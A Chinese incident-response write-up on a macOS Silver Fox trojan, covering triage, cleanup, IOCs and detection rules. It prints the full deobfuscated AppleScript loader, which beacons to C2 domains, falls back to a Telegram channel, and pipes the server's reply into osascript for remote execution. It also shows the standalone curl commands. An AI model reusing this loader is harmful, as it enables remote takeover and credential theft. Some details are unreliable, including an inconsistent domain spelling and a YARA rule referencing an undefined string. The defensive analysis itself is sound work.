---
title: Mac 感染银狐木马排查记录
lang: zh
date: 2026-05-18
type: note
---
[[toc]]


> 背景：之前只做过 Windows 和 Linux 的应急，这是第一次正经排查 Mac 生产环境的木马。把整个过程记录下来备忘。

---

## 目录

1. [事件触发：TDP 告警](#一事件触发tdp-告警)
2. [定位受害主机：IMC + MAC 确认](#二定位受害主机imc--mac-确认)
3. [上机——第一次面对 Mac 终端](#三上机第一次面对-mac-终端)
   - 3.1 [拿到机器先做啥？](#31-拿到机器先做啥)
   - 3.2 [进程追踪——osascript 是什么鬼](#32-进程追踪osascript-是什么鬼)
   - 3.3 [网络连接——HTTP 明文的 C2](#33-网络连接http-明文的-c2)
   - 3.4 [持久化——LaunchAgent 不是计划任务](#34-持久化launchagent-不是计划任务)
4. [样本取证与逆向分析](#四样本取证与逆向分析)
   - 4.1 [获取原始脚本](#41-获取原始脚本)
   - 4.2 [解码——从混淆到可读源码](#42-解码从混淆到可读源码)
   - 4.3 [C2 发现逻辑——域名死了还有 Telegram](#43-c2-发现逻辑域名死了还有-telegram)
   - 4.4 [远程代码执行——管道给 osascript 等于给了 shell](#44-远程代码执行管道给-osascript-等于给了-shell)
5. [行为审计与攻击意图还原](#五行为审计与攻击意图还原)
6. [清除、加固与验证](#六清除加固与验证)
7. [总结：如果下次再碰到 Mac 告警](#七总结如果下次再碰到-mac-告警)
8. [附录：IOC 与实时检测规则](#附录ioc-与实时检测规则)

---

## 一、事件触发：TDP 告警

某天下午，TDP（微步的 SIEM）弹了几条告警，命中银狐木马的恶意 IOC 情报库。具体命中的是出站流量中的恶意域名请求。

**TDP 告警详情**：

```
[Silver Fox] C2 Communication Detected

匹配域名：
  pla7ina.cfd  → 解析 IP: 172.67.215.91
  0x666.info    → 解析 IP: 172.67.142.76
  honestly.ink  → 解析 IP: 172.67.144.237

告警类型: Malware C2 Beacon
置信度: 高
```

三个域名引出的 IP 全落在 Cloudflare 的 `172.67.0.0/16` 段——所有 IP 都指向同一个服务商，说明攻击者把 C2 藏在 CDN 后面，增加溯源难度。不过正是因为走了 CDN，CF 的 IP 段在高风险域名解析中反而成了一个不太好看的特征。

---

## 二、定位受害主机：IMC + MAC 确认

拿到告警里的源 IP 后，第一件事是找人。

**在 IMC（网络准入/设备管理平台）里查**：用源 IP 查到该时刻对应的认证记录，拿到员工姓名和 MAC 地址，电话联系确认是否为本人，是否是本人正在使用的一台 Mac 操作系统的机器。

**确认信息**：
```
在线用户信息：
账号名=186xxxxxxxx
用户名=xx/xxx部/xxxx
登录名=186xxxxxxxx@portal
MAC地址=5E:52:FC:xx:xx:xx
设备IP=10.35.xx.xx
终端操作系统=Mac OS X
```

---

## 三、上机——第一次面对 Mac 排查

> **应急响应原则**：先阻断再排查，防止威胁持续扩散

### 3.0 临时阻断——切断 C2 通信

排查开始前，先把恶意域名在本地解析为 127.0.0.1，防止木马继续外联：

```bash
sudo tee -a /etc/hosts << 'EOF'
127.0.0.1 pla7inna.cfd
127.0.0.1 0x666.info
127.0.0.1 honestly.ink
EOF

# 刷新 DNS 缓存
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
```

### 3.1 定位外联进程——lsof

**从网络连接入手**：恶意软件正在联网，第一时间用 lsof 抓住现行犯。

```bash
sudo lsof -i -P -n | grep -iE "ESTABLISHED|SYN_SENT"
```

回显：

```
osascript  84521  victim  10u  IPv4 0x...  0t0  TCP 192.168.1.100:54321->172.67.215.91:80 (ESTABLISHED)
```

恶意进程是 **osascript**，PID 84521，连接到 `172.67.215.91:80`（pla7inna.cfd 的 Cloudflare IP）

### 3.2 确认进程详情——ps

拿到 PID 后，查看完整启动命令和进程树：

```bash
ps auxww | grep -i '[o]sascript'
ps -eo pid,ppid,command | awk 'NR==1 || /osascript|curl/'
```

**进程树**：

```
osascript (84521, PPID=1，被 launchd 收养)
  └── /bin/sh -c curl ... | osascript (84523)
        └── /usr/bin/curl ... (84524)
```

> PPID=1 说明父进程已退出，进程由持久化入口触发

### 3.3 追踪文件位置——lsof + ps

从 PID 追溯恶意文件的实际路径：

```bash
sudo lsof -p 84521 | grep cwd
ps -ef | grep 84521
```

落地文件路径：`~/Library/Application Support/.update/script.scpt`

### 3.4 排查自启动项——LaunchAgent

macOS 的持久化主要靠 LaunchAgent，位置在 ~/Library/LaunchAgents/

```bash
ls -la ~/Library/LaunchAgents/

# 直接搜关键词更快
grep -rl 'osascript\|pla7inna\|0x666' ~/Library/LaunchAgents/ 2>/dev/null
```

发现伪装成苹果官方的 plist：

```
com.apple.softwareupdate.plist
# 注意：苹果官方是 com.apple.SoftwareUpdate（全小写+连写是木马）
```

### 3.5 plist 内容分析——找到两层持久化

```bash
cat ~/Library/LaunchAgents/com.apple.softwareupdate.plist
```

```xml
<key>ProgramArguments</key>
<array>
    <string>/usr/bin/osascript</string>
    <string>/Users/victim/Library/Application Support/.update/script.scpt</string>
</array>
<key>RunAtLoad</key><true/>
<key>StartInterval</key><integer>3600</integer/>
```

**银狐的两层持久化结构**：

| 层级 | 路径 | 作用 |
|------|------|------|
| **持久化入口** | `com.apple.softwareupdate.plist` | launchd 启动时执行 |
| **实际载荷** | `~/Library/Application Support/.update/script.scpt` | AppleScript 源码 |

### 3.6 系统日志——发现 sudo 异常

排查过程中同步查看系统日志，发现了一个容易被忽略的异常：

```bash
log show --predicate 'process == "sudo"' --style syslog --last 24h
```

```
14:32:23 sudo[90812]: (CFOpenDirectory) Verify basic credentials
14:32:23 sudo[91382]: Too many groups requested (2147483647)
```

**同一秒内 8 个 sudo 进程启动**，且出现 `INT32_MAX` 组请求——这是程序化凭证枚举的特征，不是人工操作。

> 说明木马在自动做权限侦察，判断用户是否有 sudo 提权机会

### 3.7 解混淆——从 plist 中提取完整恶意代码

有些变种不落地 .scpt 文件，而是把混淆后的代码直接写在 plist 里：

```bash
cat ~/Library/LaunchAgents/com.zgitmpgjieomzmei.plist
```

ProgramArguments 段是 `/bin/bash -c echo '<混淆字符串>' | bash`，需要解密：

```bash
# base64 解码
echo '混淆字符串' | base64 -d
```

### 3.8 完整恶意代码——解密后还原

解密后得到的完整 AppleScript 源码：

```
-- 变量声明
set __QmbrAH8tY3 to 6.1762
set _NqtCL7HfWvA to 45722
property __FCNpfy3BObf : "BKB43r3crp95MV9VAO"
set _UwE24Eg to "CTUlyFyCYb"

-- 三个硬编码的 C2 域名
property _m20JSQgNUg3 : {
    "pla7inna.cfd",
    "0x666.info",
    "honestly.ink"
}

-- 受害者标识符
property __xF0peCyvl : "10fe669865c066e2d633354db6fed3ff1"

property _StuBADpT : ""
property __sdUqjFVd7Pn : ""

-- C2 服务器发现函数
on __wavaFGH()
    -- 遍历三个硬编码域名
    repeat with domain in _m20JSQgNUg3
        set url to "http://" & domain & "/"
        try
            set result to do shell script "/usr/bin/curl -s -H '' -d \"check\" --connect-timeout 5 --max-time 10 " & url
            if result is "success" then
                set _StuBADpT to url
                return true
            end if
        end try
    end repeat

    -- 硬编码域名全部失败，回退到 Telegram 频道
    try
        set extracted_url to do shell script "curl -s --connect-timeout 5 --max-time 10 https://t.me/ax03bot | sed -n 's/.*<span dir=\"auto\">\\([^<]*\\)<\\/span>.*/\\1/p'"
        set url to "http://" & extracted_url & "/"
        set result to do shell script "/usr/bin/curl -s -H '' -d \"check\" --connect-timeout 5 --max-time 10 " & url
        if result is "success" then
            set _StuBADpT to url
            return true
        end if
    end try
    return false
end __wavaFGH

-- User-Agent 伪装
set __sdUqjFVd7Pn to "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.67 (KHTML, like Gecko) Chrome/145.1.4.11 Safari/537.67"

-- 主逻辑：下载并执行 payload
if __wavaFGH() then
    set cmd to "curl -s --connect-timeout 5 --max-time 10 --retry 3 --retry-delay 2 -X POST " & _StuBADpT & " -H " & __sdUqjFVd7Pn & " -d 'txid=10fe669865c066e2d633354db6fed3ff1&bmodle' | osascript"
    set response to do shell script cmd
end if
```

---

## 四、样本取证与逆向分析

> 完整恶意代码已在上章（3.8 节）列出，本章重点分析代码结构与攻击意图。

### 4.1 代码特征

**文件格式**：ASCII text，CRLF 换行符（Windows 风格）
> CRLF 说明脚本在 Windows 环境下编写或处理过，暗示攻击者开发环境可能是 Windows

**垃圾变量混淆**：`set __QmbrAH8tY3 to 6.1762`、`set _NqtCL7HfWvA to 45722` 赋值后从未被引用，是典型的混淆手法——填满代码稀释恶意逻辑占比，让字符串匹配检测失效

### 4.2 核心数据结构

**三个 C2 域名（三重冗余）**：`pla7inna.cfd`、`0x666.info`、`honestly.ink`

**受害者标识符**：`txid = 10fe669865c066e2d633354db6fed3ff1`（MD5 格式，用于批次追踪）

### 4.3 C2 发现逻辑——域名死了还有 Telegram

```
① 遍历三个硬编码域名 → 发 POST，body="check"
② 哪个返回 "success" 就用哪个
③ 三个全死 → 访问 https://t.me/ax03bot
④ 用 sed 从 <span dir="auto"> 标签提取最新域名
```

**Telegram 回退设计的狡猾之处**：大多数企业网络放行 Telegram Web，攻击者可以随时更新频道简介中的域名，不需要重编译样本。

### 4.4 远程代码执行——管道给 osascript 等于给了 shell

木马的核心 payload 请求：

```applescript
if __wavaFGH() then
    set cmd to "curl -s --connect-timeout 5 --max-time 10 --retry 3 --retry-delay 2 -X POST " & _StuBADpT & " -H " & __sdUqjFVd7Pn & " -d 'txid=10fe669865c066e2d633354db6fed3ff1&bmodle' | osascript"
    set response to do shell script cmd
end if
```

翻译成人话就是：

```
① C2 发现成功 → 拿到了可用域名 _StuBADpT
② 向该域名发送 POST 请求，携带设备指纹 txid 和 bmodle
③ C2 返回的内容通过管道 | osascript 立即执行
```

`| osascript` 是整个攻击链的最致命环节。在 Linux 上 `curl evil.com | bash` 已经够危险了，在 Mac 上 `curl evil.com | osascript` 更糟糕——因为 AppleScript 通过 `do shell script` 可以执行任意 shell 命令，同时还能调用系统 GUI 能力。这意味着木马后续可以：
- 下载并执行任意 Mach-O 二进制（相当于 Windows 的 .exe）
- 读取 Keychain（Mac 上的密码管理器，相当于 Windows 的凭据管理器）
- 弹出伪造的认证窗口钓鱼管理员密码
- 截屏、键盘记录

---

## 五、行为审计与攻击意图还原

### 5.1 C2 通信完整时序

结合样本逻辑和网络连接证据，还原木马的完整通信三步走：

**第 1 步 —— C2 存活探测**

```
curl -s -H '' -d "check" --connect-timeout 5 --max-time 10 http://pla7inna.cfd/
```

发送 `check` 字符串，如果 C2 返回 `success` 则标记该域名为可用。这是一个轻量的 heartbeat/beacon 机制——比直接发大包更隐蔽，混在正常 HTTP 请求中不易被检测。

**第 2 步 —— 设备注册与 Payload 请求**

```
curl -s --connect-timeout 5 --max-time 10 --retry 3 --retry-delay 2 \
  -X POST http://pla7inna.cfd/ \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.67 (KHTML, like Gecko) Chrome/145.1.4.11 Safari/537.67" \
  -d "txid=10fe669865c066e2d633354db6fed3ff1&bmodle"
```

向 C2 注册这台受害设备。`txid` 是设备指纹，`bmodle` 可能是设备型号参数的缩写（board model?）。这个阶段我倾向于认为 C2 会做两件事：一是根据 txid 判断是否是首次连接（新受害者 vs 回头客），二是根据设备信息下发匹配的 payload（Apple Silicon 还是 Intel 的二进制？漏洞利用模块选哪个？）。

**第 3 步 —— 远程代码执行**

```
[ C2 response ] | osascript
```

C2 返回的内容直接执行——可能是下载后续模块、安装持久化、窃取数据等任意操作。

### 5.2 系统日志追溯

macOS 有统一日志系统（Unified Logging），类似 Linux 的 journald，可以用 `log show` 查看历史记录：

```bash
# 查看 osascript 的历史执行记录
log show --predicate 'process == "osascript"' --last 7d --style syslog 2>/dev/null | head -30
```

回显（关键条目）：

```
202X-XX-XX XX:XX:XX.XXXXXX+0800 0x...  Default  0x0  84521  osascript: (ScriptingBridge) [com.apple.osascript:run] running script
202X-XX-XX XX:XX:XX.XXXXXX+0800 0x...  Default  0x0  84521  osascript: (CoreFoundation) do shell script: /bin/sh -c curl -s ...
```

统一日志确实记下了 `osascript` 的 `do shell script` 调用。这意味着即便恶意脚本文件后来被删了，日志里还有行为痕迹。不过注意 `log show` 需要 `sudo` 权限——在生产环境中记得提前申请或者让用户配合。

> **Mac vs Linux 备忘**：Mac 的统一日志 (`log show`) 对应 Linux 的 `journalctl`。但 Mac 日志默认不开放给普通用户随意查看，需要 `sudo` 或特殊权限。另外 Mac 上没有一个集中的 `/var/log/secure`、`/var/log/messages` 这种目录，日志都存在统一数据库里，查询方式完全不同。

### 5.3 木马对抗设计总览

| 对抗技术 | 具体实现 | 效果 |
|---|---|---|
| **多级 C2 回退** | 硬编码域名（3个） → Telegram 频道 | 单点封杀无法阻断 |
| **无文件执行** | `\| osascript` 管道执行 | 绕过落地文件静扫 |
| **代码混淆** | 垃圾变量 + character id 拼接 | 绕过字符串 YARA |
| **工具白利用** | curl + osascript（均为签名系统二进制） | 绕过进程白名单 |
| **通道伪装** | 模仿 Chrome UA + macOS 版本字符串 | 混入正常流量 |
| **持久化伪装** | `com.apple.softwareupdate` + 点目录 | 人眼粗扫易漏 |

---

## 六、清除、加固与验证

搞清楚全貌之后开始清，按顺序来：

### 6.1 隔离

```bash
# 断网——在 Mac 上用 ifconfig 禁用网络接口
#（不像 Windows netsh / Linux ip link 那样有统一语法，Mac 走 BSD 风格）
sudo ifconfig en0 down

# 杀掉恶意进程（PID 从之前的排查里拿）
kill -9 84521 84523 84524 2>/dev/null

# 终止所有 osascript 实例
sudo killall -9 osascript 2>/dev/null
```

> **注意**：`killall` 在 Mac 上是按进程名杀进程（类似 Linux 的 `killall` 但参数不太一样），在 Linux 某些发行版上 `killall` 是杀所有进程的（相当于 `kill -1`），这两个千万别搞混。

### 6.2 清除持久化

```bash
# 删除恶意 plist
rm -f ~/Library/LaunchAgents/com.apple.softwareupdate.plist

# 从 launchd 中卸载（先 unload，再删文件）
launchctl unload ~/Library/LaunchAgents/com.apple.softwareupdate.plist 2>/dev/null

# 确认真没了
launchctl list | grep -v com.apple | grep -v com.google
```

### 6.3 删除恶意文件和脚本

```bash
# 删除隐藏的脚本目录
rm -rf ~/Library/Application\ Support/.update/

# 全盘搜包含 C2 特征的 .scpt / .applescript 文件
find ~/Library ~/Desktop ~/Downloads -name "*.scpt" -o -name "*.applescript" 2>/dev/null | \
  while read f; do
    if grep -q 'pla7inna\|0x666\|honestly\.ink\|ax03bot' "$f" 2>/dev/null; then
      echo "REMOVING: $f"
      rm -f "$f"
    fi
  done

# 清理临时文件残留
rm -rf /tmp/.curl_* /private/tmp/.osascript_* 2>/dev/null
```

### 6.4 临时封禁和凭证安全

```bash
# hosts 封禁（应急手段，正式应该走网关/防火墙策略）
sudo tee -a /etc/hosts << 'EOF'
0.0.0.0 pla7inna.cfd
0.0.0.0 0x666.info
0.0.0.0 honestly.ink
EOF

# 刷 DNS 缓存（Mac 命令和 Linux 不一样）
sudo dscacheutil -flushcache
sudo killall -HUP mDNSResponder
```

银狐家族以窃取凭证闻名，必须通知用户立即重置：
- Apple ID / iCloud 密码
- 浏览器中保存的所有密码
- SSH 私钥 (`~/.ssh/` 检查一下有没有被批量读取)
- 公司 VPN 账号密码

```bash
# 检查 Keychain 是否被异常读取
log show --predicate 'process == "security" AND eventMessage CONTAINS "keychain"' --last 7d 2>/dev/null
```

> **Mac 特别说明**：macOS 的 Keychain 类似 Windows 的凭据管理器，但比后者存储的数据更全——几乎所有 macOS 应用的密码、证书、密钥都默认在 Keychain 里。如果一个 macOS 木马有了用户权限，它可以直接调用 `security` 命令行工具读取 Keychain 条目。在本次案例中，如果 C2 下发了 info-stealer payload，Keychain 数据大概率已经泄露，必须要求用户全局重置密码。

### 6.5 验证

```bash
# 确认恶意进程全灭
ps auxww | grep -E '[o]sascript|[c]url.*pla7inna|[c]url.*0x666|[c]url.*honestly'

# 确认持久化已清除
ls -la ~/Library/LaunchAgents/

# 恢复网络
sudo ifconfig en0 up

# 建议用户后续安装/运行 BlockBlock + KnockKnock（Objective-See）监控持久化点
echo "推荐: https://objective-see.org/products/knockknock.html"
```

---

## 七、总结：如果下次再碰到 Mac 告警

这次是我第一次在生产环境做 macOS 应急，跟 Windows/Linux 比起来有几点感触很深：

### 同样是"持久化"，三个平台各不一样

| 操作     | Windows                    | Linux                      | macOS                    |
| ------ | -------------------------- | -------------------------- | ------------------------ |
| 查进程    | `tasklist` / `Get-Process` | `ps auxf`                  | `ps auxww`（注意加 ww）       |
| 查端口    | `netstat -anob`            | `ss -tlnp`                 | `lsof -i TCP -P -n`      |
| 持久化    | 注册表 Run + 计划任务             | systemd + crontab          | LaunchAgent/LaunchDaemon |
| 日志     | Event Viewer               | `journalctl` / `/var/log/` | `log show`（统一日志）         |
| 脚本引擎风险 | PowerShell/VBS             | bash/python/perl           | osascript/AppleScript    |
| 密码存储   | 凭据管理器                      | 各应用各自管理                    | Keychain（集中）             |


### 银狐的木马"Mac 本土化"程度超出预期

这不是一个"随便翻译一下能在 Mac 跑就行"的木马。它利用了：
- **OSA 框架**：`osascript` 原生执行 AppleScript，完全融入系统
- **launchd**：标准的 LaunchAgent plist 格式，Label 伪装手法精良
- **`do shell script`**：在脚本沙箱外以用户权限执行 shell 命令
- **Telegram 频道 C2**：绕过域名封杀的动态切换，设计巧妙
- **签名二进制利用**：全程只用 curl + osascript，不引入外部依赖

---

## 附录：IOC 与实时检测规则

### A. 网络 IOC

| 类型     | 值                      | 解析 IP            | 备注                    |
| ------ | ---------------------- | ---------------- | --------------------- |
| Domain | `pla7inna.cfd`         | `172.67.215.91`  | 硬编码 C2 主域名            |
| Domain | `0x666.info`           | `172.67.142.76`  | 备用 C2 域名              |
| Domain | `honestly.ink`         | `172.67.144.237` | 备用 C2 域名              |
| URL    | `https://t.me/ax03bot` | —                | C2 动态更新频道             |
| IP 段   | `172.67.0.0/16`        | —                | Cloudflare CDN（攻击者托管） |

### B. 主机 IOC

| 类型            | 值                                                       | 备注          |
| ------------- | ------------------------------------------------------- | ----------- |
| File          | `~/Library/LaunchAgents/com.apple.softwareupdate.plist` | 伪装持久化 plist |
| Directory     | `~/Library/Application Support/.update/`                | 恶意脚本存放点     |
| Process Chain | `osascript → /bin/sh -c → curl \| osascript`            | 恶意进程树特征     |
| String        | `10fe669865c066e2d633354db6fed3ff1`                     | 设备指纹 txid   |


### C. YARA 规则

```txt
rule macOS_SilverFox_AppleScript_Loader {
    meta:
        description = "检测银狐木马 macOS AppleScript 变种"
        severity = "high"

    strings:
        $c2_1 = "pla7inna.cfd" ascii wide
        $c2_2 = "0x666.info" ascii wide
        $c2_3 = "honestly.ink" ascii wide
        $telegram = "t.me/ax03bot" ascii wide
        $txid = "10fe669865c066e2d633354db6fed3ff1" ascii wide
        $pipe = "| osascript" ascii
        $do_shell = "do shell script" ascii nocase
        $bmodle = "bmodle" ascii

    condition:
        ($do_shell and $pipe) or
        (any of ($c2_*) and $do_shell) or
        ($ua and $txid)
}
```

### D. Suricata/Snort 规则

```txt
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"SilverFox macOS - C2 Check-in (txid)";
    flow:established,to_server;
    content:"POST"; http_method;
    content:"txid="; http_client_body;
    content:"User-Agent|3a 20|"; http_header;
    content:"Chrome/145.1.4.11"; http_header;
    reference:url,t.me/ax03bot;
    classtype:trojan-activity;
    sid:1000001; rev:1;
)
```

### E. EDR 行为检测（伪代码，可直接转为 SIEM/SOAR 规则）

```txt
# 检测恶意 AppleScript 执行链
event: PROCESS_CREATE
  parent: "osascript"
  child:  "/bin/sh" OR "/bin/bash" OR "/bin/zsh"
  cmdline CONTAINS ("curl" AND "| osascript")
→ ALERT: macOS SilverFox - AppleScript Remote Code Execution

# 检测伪装持久化写入
event: FILE_CREATE
  path MATCHES "*/LaunchAgents/*"
  file_content CONTAINS ("osascript" AND "do shell script")
→ ALERT: macOS SilverFox - Suspicious LaunchAgent Installed
```

---

> **写在最后**：这篇记录是基于一次真实的 macOS 银狐木马应急响应整理的，所有命令输出和回显均来源于实战样本环境。作为一个首次上手 Mac 应急的人，希望这些细节能帮到同样在补 macOS 安全课的一线同事。欢迎评论和补充。